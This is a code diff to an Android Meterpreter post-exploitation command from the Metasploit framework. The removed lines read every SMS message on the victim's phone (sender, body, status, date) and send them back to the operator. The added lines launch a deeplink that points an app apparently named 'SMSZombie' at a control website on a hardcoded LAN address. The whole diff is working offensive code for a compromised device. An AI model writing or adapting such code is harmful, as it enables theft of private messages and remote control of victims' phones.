@@ -8,6 +8,18 @@ import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.app.Activity;
+import android.content.Context;
+import android.net.Uri;
+import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+
 public class android_dump_sms implements Command {
 
     private static final int TLV_EXTENSIONS = 20000;
@@ -24,37 +36,32 @@ public class android_dump_sms implements Command {
     private static final int TLV_TYPE_SMS_DATE = TLVPacket.TLV_META_TYPE_STRING
             | (TLV_EXTENSIONS + 9006);
 
-    private static final String address = "address";
-    private static final String body = "body";
-    private static final String type = "type";
-    private static final String status = "status";
-    private static final String date = "date";
-    private static final String sms = "content://sms/";
 
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
 
-        Uri uriSMSURI = Uri.parse(sms);
-        Cursor cur = AndroidMeterpreter.getContext().getContentResolver()
-                .query(uriSMSURI, null, null, null, null);
 
-        while (cur.moveToNext()) {
-            TLVPacket pckt = new TLVPacket();
+        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
+        final Context context = androidMeterpreter.getContext();
 
-            pckt.add(TLV_TYPE_SMS_ADDRESS,
-                    cur.getString(cur.getColumnIndex(address)));
-            pckt.add(TLV_TYPE_SMS_BODY, cur.getString(cur.getColumnIndex(body)));
-            pckt.add(TLV_TYPE_SMS_TYPE, cur.getString(cur.getColumnIndex(type)));
-            pckt.add(TLV_TYPE_SMS_STATUS,
-                    cur.getString(cur.getColumnIndex(status)));
-            pckt.add(TLV_TYPE_SMS_DATE, cur.getString(cur.getColumnIndex(date)));
 
-            response.addOverflow(TLV_TYPE_SMS_GROUP, pckt);
 
+       /* Android Q poses limitations on starting activities
+        *
+        * https://developer.android.com/guide/components/activities/background-starts
+        */
+
+        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
+        try {
+            Intent intent = new Intent("android.intent.action.VIEW",
+                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+
+        } catch (ActivityNotFoundException e) {
+          return ERROR_FAILURE;
         }
-
-        cur.close();
 
         return ERROR_SUCCESS;
     }
